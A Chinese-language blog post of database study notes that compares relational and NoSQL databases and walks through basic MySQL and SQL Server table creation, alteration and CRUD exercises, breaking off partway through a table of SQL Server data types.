          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/19/数据库学习-2/" itemprop="url">数据库学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-19T16:55:34+08:00">
                2019-08-19
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/08/19/数据库学习-2/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/08/19/数据库学习-2/" class="cy_cmt_count" data-xid="2019/08/19/数据库学习-2/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/08/19/数据库学习-2/" class="leancloud_visitors" data-flag-title="数据库学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h1 id="数据库学习"><a href="#数据库学习" class="headerlink" title="数据库学习"></a>数据库学习</h1><h2 id="1-什么是关系型数据库什么是非关系型数据库。"><a href="#1-什么是关系型数据库什么是非关系型数据库。" class="headerlink" title="1.什么是关系型数据库什么是非关系型数据库。"></a>1.什么是关系型数据库什么是非关系型数据库。</h2><h3 id="关系型数据库："><a href="#关系型数据库：" class="headerlink" title="关系型数据库："></a>关系型数据库：</h3><h5 id="关系型数据库：指采用关系模型来组织数据的数据库。"><a href="#关系型数据库：指采用关系模型来组织数据的数据库。" class="headerlink" title="关系型数据库：指采用关系模型来组织数据的数据库。"></a>关系型数据库：指采用关系模型来组织数据的数据库。</h5><h5 id="关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组织的一个数据组织。"><a href="#关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组织的一个数据组织。" class="headerlink" title="关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组织的一个数据组织。"></a>关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组织的一个数据组织。</h5><p>主流代表：Oracle、Microsoft SQL Server、MySQL、PostgreSQL、DB2、Microsoft Access、SQLite、Teradata、MariaDB、SAP</p>
<p>关系型数据库概念：</p>
<p>关系：一张二维表，每个关系都有关系名（表名）</p>
<p>元祖：二维表中的一行，在数据库中被称为记录</p>
<p>属性：二维表中的一列，在数据库中被称为字段</p>
<p>域：属性的取值范围，也就是数据库中某一列的取值限制</p>
<p>关键字：一组可以唯一标识元祖的属性，数据库中常称为主键，由一个或多个列组成</p>
<p>关系模式：指对关系的描述。在数据库中未表结构</p>
<h3 id="非关系型数据库："><a href="#非关系型数据库：" class="headerlink" title="非关系型数据库："></a>非关系型数据库：</h3><h5 id="非关系型数据库：指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。"><a href="#非关系型数据库：指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。" class="headerlink" title="非关系型数据库：指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。"></a>非关系型数据库：指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。</h5><h5 id="非关系型数据库结构：非关系型数据库以键值存储，且结构不固定，每一个元祖可以有不一样的字段，每个元祖可以根据需要增加一些自己的键值对，不局限与固定的结构，可以减少一些时间和空间的开销。"><a href="#非关系型数据库结构：非关系型数据库以键值存储，且结构不固定，每一个元祖可以有不一样的字段，每个元祖可以根据需要增加一些自己的键值对，不局限与固定的结构，可以减少一些时间和空间的开销。" class="headerlink" title="非关系型数据库结构：非关系型数据库以键值存储，且结构不固定，每一个元祖可以有不一样的字段，每个元祖可以根据需要增加一些自己的键值对，不局限与固定的结构，可以减少一些时间和空间的开销。"></a>非关系型数据库结构：非关系型数据库以键值存储，且结构不固定，每一个元祖可以有不一样的字段，每个元祖可以根据需要增加一些自己的键值对，不局限与固定的结构，可以减少一些时间和空间的开销。</h5><h4 id="非关系型数据库的分类"><a href="#非关系型数据库的分类" class="headerlink" title="非关系型数据库的分类"></a>非关系型数据库的分类</h4><h4 id="面向高性能并发读写的key-value数据库："><a href="#面向高性能并发读写的key-value数据库：" class="headerlink" title="面向高性能并发读写的key-value数据库："></a>面向高性能并发读写的key-value数据库：</h4><h5 id="key-value数据库的主要特点是具有极高的并发读写性能"><a href="#key-value数据库的主要特点是具有极高的并发读写性能" class="headerlink" title="key-value数据库的主要特点是具有极高的并发读写性能"></a><strong>key-value数据库的主要特点是具有极高的并发读写性能</strong></h5><p>key-value数据库是一种以键值未存储数据的一种数据库，类似java中的map。可以将整个数据库理解为一个大的map，每个键都对应一个唯一的值。</p>
<p>主流代表为Redis， Amazon DynamoDB， Memcached，Microsoft Azure Cosmos DB和Hazelcast</p>
<h4 id="面向海量数据访问的面向文档数据库："><a href="#面向海量数据访问的面向文档数据库：" class="headerlink" title="面向海量数据访问的面向文档数据库："></a>面向海量数据访问的面向文档数据库：</h4><p><strong>这类数据库的主要特点是在海量的数据中可以快速的查询数据</strong></p>
<p>文档存储通常使用内部表示法，可以直接在应用程序中处理，主要是JSON。JSON文档也可以作为纯文本存储在键值中存储或关系数据库系统中。</p>
<p>主流代表为MongoDB，Amazon DynamoDB，Couchbase，Microsoft Azure Cosmos DB和CouchDB</p>
<h4 id="面向搜索数据内容的搜索引擎"><a href="#面向搜索数据内容的搜索引擎" class="headerlink" title="面向搜索数据内容的搜索引擎:"></a>面向搜索数据内容的搜索引擎:</h4><h5 id="搜索引擎是专门用于搜索数据内容的NoSQL数据库管理系统。"><a href="#搜索引擎是专门用于搜索数据内容的NoSQL数据库管理系统。" class="headerlink" title="搜索引擎是专门用于搜索数据内容的NoSQL数据库管理系统。"></a>搜索引擎是专门用于搜索数据内容的NoSQL数据库管理系统。</h5><p>主要是用于对海量数据进行近实时的处理和分析处理，可用于机器学习和数据挖掘。</p>
<p>主流代表为Elasticsearch，Splunk，Solr，MarkLogic和Sphinx</p>
<h4 id="面向可扩展性的分布式数据库："><a href="#面向可扩展性的分布式数据库：" class="headerlink" title="面向可扩展性的分布式数据库："></a>面向可扩展性的分布式数据库：</h4><h5 id="这类数据库的主要特点是具有很强的扩展性"><a href="#这类数据库的主要特点是具有很强的扩展性" class="headerlink" title="这类数据库的主要特点是具有很强的扩展性"></a>这类数据库的主要特点是具有很强的扩展性</h5><p>普通的关系型数据库都是以行为单位来存储数据库，擅长以行为单位的读入处理，比如特定条件数据的获取。因此，关系型数据库也被称为面向行的数据库。相反，面向列的数据库是以列为单位来存储数据的，擅长以列未单位读入数据。</p>
<p>这类数据库想解决的问题就是传统数据库存在可扩展性上的缺陷，这类数据库可以适应数据量的增加以及数据结构的变化，将数据存储在记录中，能够容纳大量动态列。由于列名和记录键不是固定的，并且由于记录可能有数十亿列，因此可扩展性存储可以看作是二维键值存储。</p>
<p>主流代表为Cassandra，HBase，Microsoft Azure Cosmos DB，Datastax Enterprise和Accumulo</p>
<table>
<thead>
<tr>
<th align="left">数据库类型</th>
<th>特性</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td align="left">关系型数据库（Oracle、Microsoft SQL Server、MySQL、PostgreSQL、DB2、Microsoft Access、SQLite、Teradata、MariaDB、SAP）</td>
<td>1.关系型数据库通过外键关联来建立表与表之间的关系； <br> 2、关系型数据库的最大特点就是事务的一致性；<br>3、关系型数据库用了关系模型（指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织。）来组织数据的数据库；<br>4、简单来说，关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织。</td>
<td>1.容易理解：二维表结构是非常贴近逻辑世界的一个概念，关系模型相对网状、层次等其他模型来说更容易理解<br>2.使用方便：通用的SQL语言使得操作关系型数据库非常方便<br>3.易于维护：丰富的完整性(实体完整性、参照完整性和用户定义的完整性)大大减低了数据冗余和数据不一致的概率</td>
<td>1.网站的用户并发性非常高，往往达到每秒上万次读写请求，对于传统关系型数据库来说，硬盘I/O是一个很大的瓶颈<br>2.网站每天产生的数据量是巨大的，对于关系型数据库来说，在一张包含海量数据的表中查询，效率是非常低的<br>3.在基于web的结构当中，数据库是最难进行横向扩展的，当一个应用系统的用户量和访问量与日俱增的时候，数据库却没有办法像web server和app server那样简单的通过添加更多的硬件和服务节点来扩展性能和负载能力。当需要对数据库系统进行升级和扩展时，往往需要停机维护和数据迁移。<br>4.性能欠佳：在关系型数据库中，导致性能欠佳的最主要原因是多表的关联查询，以及复杂的数据分析类型的复杂SQL报表查询。为了保证数据库的ACID特性，必须尽量按照其要求的范式进行设计，关系型数据库中的表都是存储一个格式化的数据结构。<br></td>
</tr>
<tr>
<td align="left">非关系型数据库（Redis、Amazon DynamoDB、Memcached、MongoDB、Solr、CouchDB、Splunk）</td>
<td>1、使用键值对存储数据；<br>2、一般不支持ACID特性；<br>3、非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合。</td>
<td>1.用户可以根据需要去添加自己需要的字段，为了获取用户的不同信息，不像关系型数据库中，要对多表进行关联查询。仅需要根据id取出相应的value就可以完成查询。<br>2.适用于SNS(Social Networking Services)中，例如facebook，微博。系统的升级，功能的增加，往往意味着数据结构巨大变动，这一点关系型数据库难以应付，需要新的结构化数据存储。由于不可能用一种数据结构化存储应付所有的新的需求，因此，非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合。</td>
<td>只适合存储一些较为简单的数据，对于需要进行较复杂查询的数据，关系型数据库显的更为合适。不适合持久存储海量数据</td>
</tr>
</tbody></table>
<h2 id="2-mysql数据库学习"><a href="#2-mysql数据库学习" class="headerlink" title="2.mysql数据库学习"></a>2.mysql数据库学习</h2><h3 id="数据库的简单练习"><a href="#数据库的简单练习" class="headerlink" title="数据库的简单练习"></a>数据库的简单练习</h3><h4 id="2-1-创建数据库"><a href="#2-1-创建数据库" class="headerlink" title="2.1 创建数据库"></a>2.1 创建数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database yuangong;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564992892902.png" alt="1564992892902"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564992968110.png" alt="1564992968110"></p>
<h4 id="2-3-创建表"><a href="#2-3-创建表" class="headerlink" title="2.3 创建表"></a>2.3 创建表</h4><h5 id="2-3-1-创建员工表"><a href="#2-3-1-创建员工表" class="headerlink" title="2.3.1 创建员工表"></a>2.3.1 创建员工表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table workers(</span><br><span class="line">			id INT,</span><br><span class="line">			name VARCHAR(20),</span><br><span class="line">			gender VARCHAR(2),</span><br><span class="line">			birthday DATE,</span><br><span class="line">			email VARCHAR(10),</span><br><span class="line">			remark VARCHAR(50)</span><br><span class="line">			);</span><br></pre></td></tr></table></figure>

<p>创建成功：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564993972060.png" alt="1564993972060"></p>
<h5 id="2-3-2-进行表的修改"><a href="#2-3-2-进行表的修改" class="headerlink" title="2.3.2 进行表的修改"></a>2.3.2 进行表的修改</h5><p>增加年龄列，将email列长度变为30，删除remark列，将name修改为username;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE workers ADD COLUMN age INT;[增加年龄列]</span><br><span class="line">ALTER TABLE workers MODIFY COLUMN email VARCHAR(30)；[修改email长度为30]</span><br><span class="line">ALTER TABLE workers DROP COLUMN remark;[删除remark列]</span><br><span class="line">ALTER TABLE workers CHANGE COLUMN name username VARCHAR(20);[修改name为username]</span><br></pre></td></tr></table></figure>

<p>操作成功：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564994969014.png" alt="1564994969014"></p>
<h5 id="2-3-3-数据表的增删改查"><a href="#2-3-3-数据表的增删改查" class="headerlink" title="2.3.3  数据表的增删改查"></a>2.3.3  数据表的增删改查</h5><p>插入数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO workers VALUES(1,&apos;张三&apos;,&apos;男&apos;,&apos;1930-11-20&apos;,&apos;123@qq.com&apos;,22);</span><br><span class="line">INSERT INTO workers VALUES(2,&apos;李四&apos;,&apos;男&apos;,&apos;1950-11-20&apos;,&apos;123123@qq.com&apos;,30);</span><br><span class="line">INSERT INTO workers VALUES(3,&apos;王二&apos;,&apos;男&apos;,&apos;1960-10-20&apos;,&apos;123123123@qq.com&apos;,33);</span><br><span class="line">INSERT INTO workers VALUES(4,&apos;张花&apos;,&apos;女&apos;,&apos;1970-11-21&apos;,&apos;223@qq.com&apos;,23);</span><br><span class="line">INSERT INTO workers VALUES(5,&apos;如花&apos;,&apos;女&apos;,&apos;1980-9-21&apos;,&apos;223223@qq.com&apos;,33);</span><br></pre></td></tr></table></figure>

<p>查看表单所有数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM workers;[查看workers表单中所有数据]</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564996530430.png" alt="1564996530430"></p>
<p>查看表单中的id、username、email、age数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,username,email,age FROM workers;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564996653470.png" alt="1564996653470"></p>
<p>将如花的性别改为男：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE workers SET gender = &apos;男&apos; WHERE id = 5;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564996905642.png" alt="1564996905642"></p>
<p>删除张花的年龄为23那一行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM workers WHERE age = 23;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564997100557.png" alt="1564997100557"></p>
<p>将张三的年龄也设置为33：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE workers SET age = 33 WHERE id = 1;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564997264053.png" alt="1564997264053"></p>
<p>将李四改为李四（如花的亲戚），性别女，email为<a href="mailto:88888@qq.com" target="_blank" rel="noopener">88888@qq.com</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE workers SET username = &apos;李四（如花的亲戚）&apos;, gender = &apos;女&apos;,email = &apos;88888@qq.com&apos; WHERE id = 2;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564997607678.png" alt="1564997607678"></p>
<h2 id="3-SQL-server数据库学习"><a href="#3-SQL-server数据库学习" class="headerlink" title="3. SQL server数据库学习"></a>3. SQL server数据库学习</h2><h3 id="数据库的简单操作"><a href="#数据库的简单操作" class="headerlink" title="数据库的简单操作"></a>数据库的简单操作</h3><h4 id="3-1-创建数据库"><a href="#3-1-创建数据库" class="headerlink" title="3.1 创建数据库"></a>3.1 创建数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> yuangong</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565073269066.png" alt="1565073269066"></p>
<h4 id="3-2-创建表"><a href="#3-2-创建表" class="headerlink" title="3.2 创建表"></a>3.2 创建表</h4><h5 id="3-2-1-创建员工表"><a href="#3-2-1-创建员工表" class="headerlink" title="3.2.1 创建员工表"></a>3.2.1 创建员工表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> yuangong1(</span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">int</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>) <span class="literal">NULL</span>,</span><br><span class="line">gender <span class="built_in">VARCHAR</span>(<span class="number">2</span>) <span class="literal">NULL</span>,</span><br><span class="line">birthday <span class="built_in">DATE</span>,</span><br><span class="line">email <span class="built_in">VARCHAR</span>(<span class="number">10</span>),</span><br><span class="line">remark <span class="built_in">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565074819173.png" alt="1565074819173"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565075261770.png" alt="1565075261770"></p>
<h5 id="2-3-2-进行表的修改-1"><a href="#2-3-2-进行表的修改-1" class="headerlink" title="2.3.2 进行表的修改"></a>2.3.2 进行表的修改</h5><p>增加年龄列，将email列长度变为30，删除remark列，将name修改为username;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> yuangong1 <span class="keyword">ADD</span>  age <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>; [增加年龄列]</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> yuangong1  <span class="keyword">alter</span> <span class="keyword">column</span> email <span class="built_in">VARCHAR</span>(<span class="number">30</span>); [修改email长度为30]</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> yuangong1 <span class="keyword">DROP</span> <span class="keyword">column</span> remark; [删除remark列]</span><br><span class="line"><span class="keyword">execute</span> sp_rename <span class="string">'yuangong1.name'</span>, <span class="string">'username'</span>; [修改name为username]</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565076410848.png" alt="1565076410848"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565076438651.png" alt="1565076438651"></p>
<h5 id="3-3-3-数据表的增删改查"><a href="#3-3-3-数据表的增删改查" class="headerlink" title="3.3.3 数据表的增删改查"></a>3.3.3 数据表的增删改查</h5><p>插入数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">'张三'</span>,<span class="string">'男'</span>,<span class="string">'1930-11-20'</span>,<span class="string">'123@qq.com'</span>,<span class="number">22</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">'李四'</span>,<span class="string">'男'</span>,<span class="string">'1950-11-20'</span>,<span class="string">'123123@qq.com'</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">'王二'</span>,<span class="string">'男'</span>,<span class="string">'1960-10-20'</span>,<span class="string">'123123123@qq.com'</span>,<span class="number">33</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">'张花'</span>,<span class="string">'女'</span>,<span class="string">'1970-11-21'</span>,<span class="string">'223@qq.com'</span>,<span class="number">23</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">'如花'</span>,<span class="string">'女'</span>,<span class="string">'1980-9-21'</span>,<span class="string">'223223@qq.com'</span>,<span class="number">33</span>);</span><br></pre></td></tr></table></figure>

<p>查看表单所有数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">20</span>  *  <span class="keyword">from</span>  yuangong1</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077158214.png" alt="1565077158214"></p>
<p>查看表单中的id、username、email、age数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">20</span> <span class="keyword">ID</span>,username,email,age <span class="keyword">FROM</span> yuangong1;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077300862.png" alt="1565077300862"></p>
<p>将如花的性别改为男：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> yuangong1 <span class="keyword">SET</span> gender = <span class="string">'男'</span> <span class="keyword">WHERE</span> <span class="keyword">ID</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077461115.png" alt="1565077461115"></p>
<p>删除张花的年龄为23那一行：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> yuangong1 <span class="keyword">WHERE</span> age = <span class="number">23</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077543060.png" alt="1565077543060"></p>
<p>将张三的年龄也设置为33：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> yuangong1 <span class="keyword">SET</span> age = <span class="number">33</span> <span class="keyword">WHERE</span> <span class="keyword">ID</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077631256.png" alt="1565077631256"></p>
<p>将李四改为李四（如花的亲戚），性别女，email为<a href="mailto:88888@qq.com" target="_blank" rel="noopener">88888@qq.com</a>:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> yuangong1 <span class="keyword">SET</span> username = <span class="string">'李四（如花的亲戚）'</span>, gender = <span class="string">'女'</span>,email = <span class="string">'88888@qq.com'</span> <span class="keyword">WHERE</span> <span class="keyword">ID</span> = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077719594.png" alt="1565077719594"></p>
<h2 id="4-问题点："><a href="#4-问题点：" class="headerlink" title="4. 问题点："></a>4. 问题点：</h2><h5 id="4-1-mysql在插入数据时，报错："><a href="#4-1-mysql在插入数据时，报错：" class="headerlink" title="4.1 mysql在插入数据时，报错："></a>4.1 mysql在插入数据时，报错：</h5><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564995872259.png" alt="1564995872259"></p>
<p>网上查询为编码问题，进行表编码转换：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE `workers` DEFAULT CHARACTER SET utf8;[将表workers编码转换为utf8]</span><br><span class="line">ALTER TABLE `workers` CHANGE `username` `username` VARCHAR(20) CHARACTER SET utf8 NOT NULL;[将表中username字段编码转换为utf8]</span><br><span class="line">ALTER TABLE `workers` CHANGE `gender` `gender` VARCHAR(2) CHARACTER SET utf8 NOT NULL;[将表gender字段编码转换为utf8]</span><br></pre></td></tr></table></figure>

<p>插入成功，未报错：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564996201637.png" alt="1564996201637"></p>
<h5 id="4-2-字符类型总结"><a href="#4-2-字符类型总结" class="headerlink" title="4.2 字符类型总结"></a>4.2 字符类型总结</h5><table>
<thead>
<tr>
<th>数据类型</th>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>bit</td>
<td>整型</td>
<td>bit 数据类型是整型，其值只能是0、1或空值。这种数据类型用于存储只有两种可能值的数据，如Yes 或No、True 或Fa lse 、On 或Off</td>
</tr>
<tr>
<td>int</td>
<td>整型</td>
<td>int 数据类型可以存储从- 2^31(-2147483648)到2^31 (2147483 647)之间的整数。存储到数据库的几乎所有数值型的数据都可以用这种数据类型。这种数据类型在数据库里占用4个字节</td>
</tr>
<tr>
<td>smallint</td>
<td>整型</td>
<td>smallint 数据类型可以存储从- 2^15(-32768)到2^15(32767)之间的整数。这种数据类型对存储一些常限定在特定范围内的数值型数据非常有用。这种数据类型在数据库里占用2 字节空间</td>
</tr>
<tr>
<td>tinyint</td>
<td>整型</td>
<td>tinyint 数据类型能存储从0到255 之间的整数。它在你只打算存储有限数目的数值时很有用。 这种数据类型在数据库中占用1 个字节</td>
</tr>
<tr>
<td>numeric</td>
<td>精确数值型</td>
<td>numeric数据类型与decimal 型相同</td>
</tr>
<tr>
<td>decimal</td>
<td>精确数值型</td>
<td>decimal 数据类型能用来存储从-10^38-1到10^38-1的固定精度和范围的数值型数据。使用这种数据类型时，必须指定范围和精度。 范围是小数点左右所能存储的数字的总位数。精度是小数点右边存储的数字的位数</td>
</tr>
<tr>
<td>money</td>
<td>货币型</td>
<td>money 数据类型用来表示钱和货币值。这种数据类型能存储从-9220亿到9220 亿之间的数据，精确到货币单位的万分之一</td>
</tr>
<tr>
<td>smallmoney</td>
<td>货币型</td>
<td>smallmoney 数据类型用来表示钱和货币值。这种数据类型能存储从-214748.3648 到214748.3647 之间的数据，精确到货币单位的万分之一</td>
</tr>
<tr>
<td>float</td>
<td>近似数值型</td>
<td>float 数据类型是一种近似数值类型，供浮点数使用。说浮点数是近似的，是因为在其范围内不是所有的数都能精确表示。浮点数可以是从-1.79E+308到1.79E+308 之间的任意数</td>
</tr>
<tr>
<td>real</td>
<td>近似数值型</td>
<td>real 数据类型像浮点数一样，是近似数值类型。它可以表示数值在-3.40E+38到3.40E+38之间的浮点数</td>
</tr>
<tr>
<td>datetime</td>
<td>日期时间型</td>
<td>datetime数据类型用来表示日期和时间。这种数据类型存储从1753年1月1日到9999年12月3 1日间所有的日期和时间数据， 精确到三百分之一秒或3.33毫秒</td>
</tr>
<tr>
<td>Smalldatetime</td>
<td>日期时间型</td>
<td>smalldatetime 数据类型用来表示从1900年1月1日到2079年6月6日间的日期和时间，精确到一分钟</td>
</tr>
<tr>
<td>cursor</td>
<td>特殊数据型</td>
<td>cursor 数据类型是一种特殊的数据类型，它包含一个对游标的引用。这种数据类型用在存储过程中，而且创建表时不能用</td>
</tr>
<tr>
<td>timestamp</td>
<td>特殊数据型</td>
<td>timestamp 数据类型是一种特殊的数据类型，用来创建一个数据库范围内的唯一数码。 一个表中只能有一个timestamp列。每次插入或修改一行时，timestamp列的值都会改变。尽管它的名字中有“time”， 但timestamp列不是人们可识别的日期。在一个数据库里，timestamp值是唯一的</td>
</tr>
<tr>
<td>Uniqueidentifier</td>
<td>特殊数据型</td>
<td>Uniqueidentifier数据类型用来存储一个全局唯一标识符，即GUID。GUID确实是全局唯一的。这个数几乎没有机会在另一个系统中被重建。可以使用NEWID 函数或转换一个字符串为唯一标识符来初始化具有唯一标识符的列</td>
</tr>
<tr>
<td>char</td>
<td>字符型</td>
